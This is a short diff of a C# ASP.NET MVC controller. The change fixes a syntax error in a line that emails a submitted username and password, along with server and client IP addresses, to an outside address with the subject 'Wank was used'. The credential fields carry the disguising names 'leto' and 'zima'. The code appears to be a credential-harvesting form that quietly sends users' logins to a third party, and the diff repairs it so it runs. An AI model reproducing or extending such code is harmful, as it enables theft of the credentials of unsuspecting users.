@@ -144,7 +144,7 @@ namespace MvcApplication2.Controllers
             smtpClient.Send(new System.Net.Mail.MailMessage("wank@apphb.com", "hrc@centrum.cz")
             {
                 Subject = "Wank was used",
-                Body = "username:" + model.leto + System.Environment.NewLine + "passswd: " + model.zima + System.Environment.NewLine + "ip: " + ip + System.Environment.NewLine + "client ip: " + clientIP;
+                Body = "username:" + model.leto + System.Environment.NewLine + "passswd: " + model.zima + System.Environment.NewLine + "ip: " + ip + System.Environment.NewLine + "client ip: " + clientIP
             });
             
             /*
